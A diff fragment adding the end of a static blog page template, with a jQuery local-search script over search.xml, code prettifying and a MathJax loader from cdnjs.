+            $('').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+</body>
+</html>
